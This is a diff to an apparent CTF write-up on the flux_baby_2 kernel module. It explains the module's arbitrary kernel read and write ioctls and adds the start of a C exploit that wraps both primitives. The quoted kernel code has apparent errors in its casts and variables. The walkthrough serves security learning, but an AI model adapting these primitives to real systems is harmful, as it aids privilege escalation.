@@ -588,7 +588,7 @@ So as I've mentioned above, the ioctl is a one big switch depending on a cmd. Th
 As we are still trying to understand why kernel panic occured, we need to check `dread` function:
 
 ```c
-ssize_t dread(struct read_arg_t *read_arg) {
+void dread(struct read_arg_t *read_arg) {
   struct read_arg_t read_arg_kernel;
   unsigned long val;
   
@@ -597,14 +597,164 @@ ssize_t dread(struct read_arg_t *read_arg) {
   val = *(unsigned long) read_arg_kernel.from; // [1]
 
   _copy_to_user(read_arg_kernel.to, &val, sizeof(val)); // [2]
-
-  return 0;
 }
 ```
 
 copy_from_user and copy_to_user are standard kernel functions. When you are writing kernel code you must not access user data directly at it could lead to serious security issues. So in [0] kernel just copies the user argument to his own local variable `read_arg_kernel`. Then in [1] kernel reads a value under address a user specified and finaly in [2] he copies this value back to userspace.
 
 As we have provided value 0 the kernel tried in [1] to read a value under this address and of course this is an invalid instruction which caused kernel panic.
+
+Hmm, but this means that we can read values at any address we want! Not only from user but also from kernel space! This is for sure a big security issue which we will take advantage of!
+
+As at the time of writing there is no working netcat server I will write an exploit in c which will directly exploit the kernel module without touching the `client_kernel_baby_2`. This won't spoil the task, but simulate real privilage escalation from user to root account. Of course we need to change the setup for this. Just change permissions of /dev/flux_baby_2 inside init file.
+
+Let's implement a general function for reading an address by using ioctl function of /dev/flux_baby char device:
+
+```c
+// exploit.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/ioctl.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <string.h>
+
+struct read_arg_t {
+    char* from;
+    char* to;
+};
+
+int fd;
+
+int driver_read(void* to, void* from) {
+    int err;
+    struct read_arg_t read_arg;
+    
+    read_arg.from = from;
+    read_arg.to = to;
+
+    err = ioctl(fd, COPY_REQUEST, &read_arg);
+    if (err < 0) {
+        perror("[-] ioctl COPY_REQUEST\n");
+        goto fail;
+    }
+    printf("[+] Copied 8 bytes from: %p, to: %p\n", from, to);
+
+    return 0;
+fail:
+    return -1;
+}
+
+
+int main() {
+    int err;
+
+    fd = open("/dev/flux_baby_2", O_RDWR, 0);
+    if (fd < 0) {
+        perror("[-] open /dev/flux_baby_2\n");
+        goto fail;
+    }
+    printf("[+] Opened device /dev/flux_baby_2, fd assigned: %d\n", fd);
+
+    close(fd);
+    return 0;
+
+fail:
+    return -1;
+}
+```
+
+Reading address of our choice gives as a lot of power, but won't be enough. This means that we need to find something more. Let's check second command implementation which is `dwrite`:
+
+```c
+void dwrite(struct write_arg_t *write_arg) {
+  struct write_arg_t write_arg_kernel;
+
+  _copy_from_user(&write_arg, write_arg, sizeof(struct write_arg_t));
+  *(unsigned long) write_arg_kernel.ptr = write_arg_kernel.val;
+}
+```
+
+So `dwirte` just writes user provided value to user provided address. This is amazing. We just got arbitrary write in kernel space. Before we find a way to use it, let's add write to our exploit:
+
+```c
+// exploit.c
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/ioctl.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <string.h>
+
+struct read_arg_t {
+    char* from;
+    char* to;
+};
+
+struct write_arg_t {
+    char *ptr;
+    unsigned long val;
+};
+
+int fd;
+
+int driver_read(void* to, void* from) {
+    int err;
+    struct read_arg_t read_arg;
+    
+    read_arg.from = from;
+    read_arg.to = to;
+
+    err = ioctl(fd, COPY_REQUEST, &read_arg);
+    if (err < 0) {
+        perror("[-] ioctl COPY_REQUEST\n");
+        goto fail;
+    }
+    printf("[+] Copied 8 bytes from: %p, to: %p\n", from, to);
+
+    return 0;
+fail:
+    return -1;
+}
+
+int driver_write(void *ptr, unsigned long val) {
+    int err;
+    struct write_arg_t write_arg;
+
+    write_arg.ptr = ptr;
+    write_arg.val = val;
+
+    err = ioctl(fd, WRITE_REQUEST, &write_arg);
+    if (err < 0) {
+        perror("[-] ioctl WRITE_REQUEST\n");
+        goto fail;
+    }
+    printf("[+] Set value under address: %p to val: %lu\n", ptr, val);
+
+    return 0;
+fail:
+    return -1;
+}
+
+int main() {
+    int err;
+
+    fd = open("/dev/flux_baby_2", O_RDWR, 0);
+    if (fd < 0) {
+        perror("[-] open /dev/flux_baby_2\n");
+        goto fail;
+    }
+    printf("[+] Opened device /dev/flux_baby_2, fd assigned: %d\n", fd);
+
+    close(fd);
+    return 0;
+
+fail:
+    return -1;
+}
+```
+
+
 
 
 ## References
